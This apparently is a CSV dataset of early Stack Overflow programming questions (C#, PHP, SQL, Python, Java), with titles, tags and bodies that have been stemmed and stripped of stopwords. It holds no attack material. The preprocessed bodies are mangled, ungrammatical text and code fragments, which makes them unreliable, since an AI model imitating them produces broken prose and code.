,DId,DTitle,DBody,DTags
0,9,How do I calculate someone's age based on a DateTime type birthday?,"given datetim repres person' birthday, calcul age years?",<c#><.net><datetime>
1,11,Calculate relative time in C#,"given specif datetim value, display rel time, like: 2 hour ago 3 day ago month ago",<c#><datetime><time><datediff><relative-time-span>
2,4,How to convert a Decimal to a Double in C#?,"want use track-bar chang form' opacity. code: decim tran = trackbar1.valu / 5000; this.opac = trans; build application, give follow error: cannot implicitli convert type decim doubl tri use tran double, control work. code work fine past vb.net project.",<c#><floating-point><type-conversion><double><decimal>
3,13,Determine a user's timezone,standard way web server abl determin user' timezon within web page? perhap http header part user-ag string?,<html><browser><timezone><user-agent><timezone-offset>
4,371,How do you make sure email you send programmatically is not automatically marked as spam?,"tricki one i'v alway reli techniques, permission-bas email (i.e. send peopl permiss send to) use blatantli spamish terminology. late, email send programmat start shuffl people' spam folder automat i'm wonder it. despit fact particular email one human would mark spam, specifically, email contain licens key peopl paid good money for, think they'r go consid spam figur big topic essenti ignor simpleton.",<email><email-spam>
5,17,Binary Data in MySQL,store binari data mysql?,<mysql><database><binary-data><data-storage>
6,227,What's the best way to generate a tag cloud from an array using h1 through h6 for sizing?,"follow arrays: $artist = array(""th roots"", ""michael jackson"", ""billi idol"", ""more"", ""and more"", ""and_yet_more""); $count = array(5, 3, 9, 1, 1, 3); want gener tag cloud artist higher number $count enclos h6 tag lowest enclos h1 tags.",<php><arrays><tag-cloud>
7,14,Difference between Math.Floor() and Math.Truncate(),differ math.floor() math.truncate() .net?,<.net><math>
8,289,How do you sort a dictionary by value?,"often sort dictionary, consist key & values, value. example, hash word respect frequencies, want order frequency. sortedlist good singl valu (say frequency), want map back word. sorteddictionari order key, value. resort custom class, cleaner way?",<c#><.net><sorting><dictionary>
9,180,Function for creating color wheels,"someth i'v pseudo-solv mani time never quit found solut for. problem come way gener n colors, distinguish possibl n parameter.",<algorithm><language-agnostic><colors><color-space>
10,24,Throw an error preventing a table update in a MySQL trigger,"trigger updat table, throw error prevent updat table?",<mysql><database><triggers>
11,48,Multiple submit buttons in an HTML form,"let' say creat wizard html form. one button goe back, one goe forward. sinc back button appear first markup press enter, use button submit form. example: <form> <!-- put cursor field press enter --> <input type=""text"" name=""field1"" /> <!-- button submit --> <input type=""submit"" name=""prev"" value=""previ page"" /> <!-- button want submit --> <input type=""submit"" name=""next"" value=""next page"" /> </form> would like get decid button use submit form user press enter. way, press enter wizard move next page, previous. use tabindex this?",<html><forms><form-submit><submit-button>
12,336,When to use unsigned values over signed ones?,"appropri use unsign variabl sign one? loop? hear lot opinion want see anyth resembl consensus. (unsign int = 0; < something.length(); i++) { someth var = something.at(i); // get idea. } know java unsign values, must conciou decis sun microsystems' part.",<language-agnostic><types>
13,260,Adding scripting functionality to .NET applications,"littl game written c#. use databas back-end. trade card game, want implement function card script. mean essenti interface, icard, card class implement (public class card056: icard) contain function call game. now, make thing maintainable/moddable, would like class card sourc code databas essenti compil first use. add/chang card, i'll add databas tell applic refresh, without need assembl deploy (especi sinc would talk 1 assembl per card mean hundr assemblies). possible? regist class sourc file instanti it, etc. icard cards[current] = new mygame.cardlibrary.card056(); cards[current].onenterplay(ref currentgamestate); languag c# extra bonu possibl write script .net language.",<c#><.net><scripting><compiler-construction>
14,328,PHP Session Security,guidelin maintain respons session secur php? there' inform web time land one place!,<security><php>
15,361,Generate list of all possible permutations of a string,"would go gener list possibl permut string x charact length, contain variabl list characters. languag would work, portable.",<string><language-agnostic><cross-platform>
16,90,How do you branch and merge with TortoiseSVN?,branch merg apach subvers use tortoisesvn client?,<svn><tortoisesvn><branch><branching-and-merging>
17,564,What is the difference between an int and an Integer in Java and C#?,"read joel softwar came across joel spolski say someth particular type programm know differ int integ java/c# (object-ori program languages). so, difference?",<c#><java><integer><int>
18,609,Build for Windows NT 4.0 using Visual Studio 2005?,"mfc applic i'm tri migrat use afxext.h, caus _afxdll get set, caus error set /mt: pleas use /md switch _afxdll build research date indic imposs build applic execut window nt 4.0 use visual studio (c++, case) 2005. realli true? workaround available?",<c++><visual-studio><compatibility><windows-nt>
19,626,"When to use lambda, when to use Proc.new?","rubi 1.8, subtl differ proc/lambda one hand, proc.new other. differences? give guidelin decid one choose? rubi 1.9, proc lambda different. what' deal?",<ruby><lambda><proc>
20,752,How to create a new object instance from a Type,"one may alway know type object compile-time, may need creat instanc type. get new object instanc type?",<c#><.net><performance><reflection><types>
21,773,How do I use itertools.groupby()?,"abl find understand explan actual use python' itertools.groupby() function. i'm tri this: take list - case, children objectifi lxml element divid group base criteria later iter group separately. i'v review documentation, i'v troubl tri appli beyond simpl list numbers. so, use itertools.groupby()? anoth techniqu using? pointer good ""prerequisite"" read would also appreciated.",<python><itertools>
22,972,Adding a Method to an Existing Object Instance,"i'v read possibl add method exist object (i.e., class definition) python. understand alway good so. might one this?",<python><oop><methods><monkeypatching>
23,1108,How does database indexing work?,"given index import data set increas size, someon explain index work database-agnost level? inform queri index field, check index databas column.",<sql><database><performance><indexing><database-indexes>
24,549,The definitive guide to form-based website authentication,"form-bas authent websit believ stack overflow resourc specif technic questions, also gener guidelin solv variat common problems. ""form base authent websites"" fine topic experiment. includ topic as: log log remain log manag cooki (includ recommend settings) ssl/http encrypt store password use secret question forgotten username/password function use nonc prevent cross-sit request forgeri (csrf) openid ""rememb me"" checkbox browser autocomplet usernam password secret url (public url protect digest) check password strength e-mail valid much form base authentication... includ thing like: role author http basic authent pleas help us by: suggest subtop submit good articl subject edit offici answer",<security><http><authentication><language-agnostic><article>
25,1304,How to check for file lock?,"way check whether file lock without use try/catch block? right now, way know open file catch system.io.ioexception.",<c#><.net><io><filelock>
26,879,Are PHP Variables passed by value or by reference?,php variabl pass valu reference?,<php><variables><pass-by-reference><pass-by-value>
27,2384,Read binary file into a struct,"i'm tri read binari data use c#. inform layout data file want read. i'm abl read data ""chunk chunk"", i.e. get first 40 byte data convert string, get next 40 bytes. sinc least three slightli differ version data, would like read data directli struct. feel much right read ""line line"". tri follow approach avail: structtyp astruct; int count = marshal.sizeof(typeof(structtype)); byte[] readbuff = new byte[count]; binaryread reader = new binaryreader(stream); readbuff = reader.readbytes(count); gchandl handl = gchandle.alloc(readbuffer, gchandletype.pinned); astruct = (structtype) marshal.ptrtostructure(handle.addrofpinnedobject(), typeof(structtype)); handle.free(); stream open filestream began read from. get accessviolationexcept use marshal.ptrtostructure. stream contain inform i'm tri read sinc i'm interest data end file. struct defin like: [structlayout(layoutkind.explicit)] struct structtyp { [fieldoffset(0)] public string filedate; [fieldoffset(8)] public string filetime; [fieldoffset(16)] public int id1; [fieldoffset(20)] public string id2; } exampl code chang origin make question shorter. would read binari data file struct?",<c#><struct><io><binaryfiles>
28,2530,How do you disable browser autocomplete on web form field / input tags?,disabl autocomplet major browser specif input (or form field)?,<html><forms><browser><autocomplete>
29,888,How do you debug PHP scripts?,debug php scripts? awar basic debug use error reporting. breakpoint debug phpeclips also quit useful. best (in term fast easy) way debug phpstorm ide?,<php><eclipse><debugging><phpstorm><xdebug>
30,588,Best way to access Exchange using PHP?,"i'm write cm applic php one requir must abl interfac customer' exchang server. i'v written function time alway use webdav it, i'm lean away that. run site ii apach (no preference) window server 2008. thing would need includ ad contact given user' address book, send email given user run report contact user. pretti easi webdav, better way requir function like deprec time soon. ideas? update: justin, love idea use com objects, worri maintain 3rd product make everyth work... john, write web servic c# interfac function access php app, also littl bit way. far, i'm 100% convinc either better webdav... anyon show i'm silly?",<php><windows><exchange-server><webdav><mapi>
31,769,Solving a linear equation,"need programmat solv system linear equat c, object c, (if needed) c++. here' exampl equations: -44.3940 = * 50.0 + b * 37.0 + tx -45.3049 = * 43.0 + b * 39.0 + tx -44.9594 = * 52.0 + b * 41.0 + tx this, i'd like get best approxim a, b, tx.",<math><linear-algebra><system><linear-equation>
32,1669,Learning to write a compiler,"prefer languages: c/c++, java, ruby. look help books/tutori write compil simpli educ purposes. familiar c/c++, java, ruby, prefer resourc involv one three, good resourc acceptable.",<compiler-construction><language-agnostic>
33,1854,Python: What OS am I running on?,"need look see whether i'm window unix, etc?",<python><cross-platform><platform-specific><platform-agnostic>
34,2232,How to call shell commands from Ruby,call shell command insid rubi program? get output command back ruby?,<ruby><shell><interop>
35,3748,Storing Images in DB - Yea or Nay?,"i'm use app store imag heavili db. what' outlook this? i'm type store locat filesystem, store directli db. think pros/cons?",<database><image><theory><storage><blob>
36,6392,Java Time Zone is messed up,"run tomcat application, need display time values. unfortunately, time come hour off. look discov default timezon set to: sun.util.calendar.zoneinfo[id=""gmt-08:00"", offset=-28800000, dstsavings=0, usedaylight=false, transitions=0, lastrule=null] rather pacif time zone. indic tri print default time zone' display name, come ""gmt-08:00"", seem indic correctli set us pacif time zone. run ubuntu hardi heron, upgrad gutsi gibbon. configur file updat tell jre use pacif associ daylight save time information? time machin show correctly, seem os-wid misconfiguration. ok, here' update. cowork suggest updat java_opt /etc/profil includ ""-duser.timezone=us/pacific"", work (i also saw catalina_opts, updat well). actually, export chang variabl rather use new /etc/profil (a reboot later pick chang golden). however, still think better solution... configur java somewher say timezon using, grab timezone. someon know setting, would awesome, decent workaround. use 1.5, definit dst problem. see, time zone set use daylight savings. belief gener set -8 offset rather specif pacif timezone. sinc gener -8 offset daylight save info, cours use it, question is, tell java use pacif time zone start up? i'm look programmat solution, configur solution.",<java><linux><timezone>
37,3927,What Are Some Good .NET Profilers?,"profil use work .net programs, would particularli recommend?",<c#><.net><profiling><profiler>
38,5419,"Python, Unicode, and the Windows console","tri print unicod string window console, get error . unicodeencodeerror: 'charmap' codec can't encod charact .... assum window consol accept unicode-onli characters. what' best way around this? way make python automat print ? instead fail situation? edit: i'm use python 2.5. note: @lassev.karlsen answer checkmark sort outdat (from 2008). pleas use solutions/answers/suggest care!! @jfsebastian answer relev today (6 jan 2016).",<python><unicode>
39,2647,How do I split a string so I can access item x?,"use sql server, split string access item x? take string ""hello john smith"". split string space access item index 1 return ""john""?",<sql><sql-server><tsql><split>
40,5727,What are the barriers to understanding pointers and what can be done to overcome them?,"pointer lead factor confus mani new, even old, colleg level student c c++? tool thought process help understand pointer work variable, function, beyond level? good practic thing done bring somebodi level of, ""ah-hah, got it,"" without get bog overal concept? basically, drill like scenarios.",<c++><c><pointers>
41,5222,Accessing post variables using Java Servlets,"java equival php' $_post? search web hour, i'm still nowher closer.",<java><http><servlets>
42,5223,Length of a JavaScript object,"javascript object. built-in accept best practic way get length object? const myobject = new object(); myobject[""firstname""] = ""gareth""; myobject[""lastname""] = ""simpson""; myobject[""age""] = 21;",<javascript><javascript-objects>
43,4736,Learning Regular Expressions,"realli understand regular expressions. explain easy-to-follow manner? onlin tool books, could also link them?",<regex>
44,4149,How do I use Java to read from a file that is actively being written to?,"applic write inform file. inform use post-execut determin pass/failure/correct application. i'd like abl read file written pass/failure/correct check real time. assum possibl this, gotcha' involv use java? read catch writing, wait write file closed, read throw except point? latter, then? intuit current push toward bufferedstreams. way go?",<java><file><file-io>
45,3164,Absolute path back to web-relative path,"manag locat verifi exist file use server.mappath want send user directli file, fastest way convert absolut path back rel web path?",<c#><asp.net><.net><path><mappath>
46,2525,.NET obfuscation tools/strategy,"product sever components: asp.net, window form app window service. 95% code written vb.net. intellectu properti reasons, need obfusc code, use version dotfusc 5 year old. i'm think time move new gener tool. i'm look list requir consid search new obfuscator. know look far: serialization/de-serialization. current solution, simpli tell tool obfusc class data member pain abl load data previous serial simpli big. integr build process work asp.net. past, found problemat due chang .dll name (you often one per page) - tool handl well.",<.net><security><obfuscation>
47,3061,Calling a function of a module by using its name (a string),"best way go call function given string function' name python program. example, let' say modul foo, string whose content ""bar"". best way call foo.bar()? need get return valu function, use eval. figur use eval defin temp function return result function call, i'm hope eleg way this.",<python><object>
48,2120,Convert HashBytes to VarChar,"want get md5 hash string valu sql server 2005. follow command: select hashbytes('md5', 'helloworld') however, return varbinari instead varchar value. attempt convert 0x68e109f0f40ca72a15e05cc22786f8e6 varchar get há ðô§*à\â'†øæ instead 68e109f0f40ca72a15e05cc22786f8e6. sql-base solution? ye",<sql><sql-server>
49,3255,"Big O, how do you calculate/approximate it?","peopl degre cs certainli know big stand for. help us measur well algorithm scales. i'm curious, calcul approxim complex algorithms?",<algorithm><optimization><complexity-theory><big-o><performance>
50,4230,The Difference Between a DataGrid and a GridView in ASP.NET?,"i'v asp.net develop littl now, i'v use gridview datagrid control variou things, never could find realli good reason use one other. i'd like know: differ 2 asp.net controls? advantag disadvantag both? one faster? newer? easier maintain? intellisens summari control seem describ differ two. view, edit, sort data automat gener column runtime. edit: visual studio 2008 longer list datagrid avail control toolbox. still avail (for legaci support assume) type hand though.",<asp.net>
51,2871,Reading a C/C++ data structure in C# from a byte array,"would best way fill c# struct byte[] array data c/c++ struct? c struct would look someth like (mi c rusty): typedef oldstuff { char name[8]; uint32 user; char location[8]; uint32 timestamp; uint32 sequence; char tracking[16]; char filler[12]; } would fill someth like this: [structlayout(layoutkind.explicit, size = 56, pack = 1)] public struct newstuff { [marshalas(unmanagedtype.byvaltstr, sizeconst = 8)] [fieldoffset(0)] public string name; [marshalas(unmanagedtype.u4)] [fieldoffset(8)] public uint user; [marshalas(unmanagedtype.byvaltstr, sizeconst = 8)] [fieldoffset(12)] public string location; [marshalas(unmanagedtype.u4)] [fieldoffset(20)] public uint timestamp; [marshalas(unmanagedtype.u4)] [fieldoffset(24)] public uint sequence; [marshalas(unmanagedtype.byvaltstr, sizeconst = 16)] [fieldoffset(28)] public string tracking; } best way copi oldstuff newstuff, oldstuff pass byte[] array? i'm current someth like following, feel kind clunky. gchandl handle; newstuff mystuff; int buffers = marshal.sizeof(typeof(newstuff)); byte[] buff = new byte[buffersize]; array.copy(somebytearray, 0, buff, 0, buffersize); handl = gchandle.alloc(buff, gchandletype.pinned); mystuff = (newstuff)marshal.ptrtostructure(handle.addrofpinnedobject(), typeof(newstuff)); handle.free(); better way accomplish this? would use binaryread class offer perform gain pin memori use marshal.ptrstructure?",<c#><.net><data-structures><marshalling>
52,2155,How do I define custom web.config sections with potential child elements and attributes for the properties?,web applic develop often requir co-depend configur set also set chang move environments. set current simpl key-valu pair would use creat custom config section obviou two valu need chang togeth set need chang environment. what' best way creat custom config section special consider make retriev values?,<asp.net>
